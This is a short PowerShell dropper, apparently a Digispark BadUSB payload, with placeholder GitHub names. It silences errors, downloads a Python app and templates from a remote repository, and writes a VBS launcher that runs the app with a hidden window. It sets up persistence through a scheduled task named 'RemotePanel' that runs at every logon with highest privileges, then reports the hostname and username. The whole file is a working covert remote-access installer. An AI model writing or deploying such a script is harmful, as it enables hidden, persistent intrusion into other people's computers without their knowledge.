$ErrorActionPreference = "SilentlyContinue"
$folder = "$env:USERPROFILE\testemipo"

if (Test-Path "$folder\app.py") { exit }

$githubUser = "SEU_USER_GITHUB"
$repo = "SEU_REPO"
$baseUrl = "https://raw.githubusercontent.com/$githubUser/$repo/main/testdigispark"

New-Item -ItemType Directory -Path "$folder\templates" -Force | Out-Null

Invoke-WebRequest -Uri "$baseUrl/app.py" -OutFile "$folder\app.py"
Invoke-WebRequest -Uri "$baseUrl/start.vbs" -OutFile "$folder\start.vbs"
Invoke-WebRequest -Uri "$baseUrl/templates/index.html" -OutFile "$folder\templates\index.html"

$pyPath = "$env:LOCALAPPDATA\Python\bin\python.exe"
if (-not (Test-Path $pyPath)) { $pyPath = "python.exe" }

$vbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.CurrentDirectory = "$folder"
WshShell.Run """$pyPath"" -B $folder\app.py", 0, False
"@
Set-Content -Path "$folder\start.vbs" -Value $vbsContent -Encoding ASCII

schtasks /create /tn "RemotePanel" /tr "wscript.exe `"$folder\start.vbs`"" /sc onlogon /rl highest /f | Out-Null

Start-Process -FilePath "wscript.exe" -ArgumentList "`"$folder\start.vbs`"" -WindowStyle Hidden

$hostname = $env:COMPUTERNAME
$username = $env:USERNAME
Write-Host "Painel instalado: $hostname ($username)"
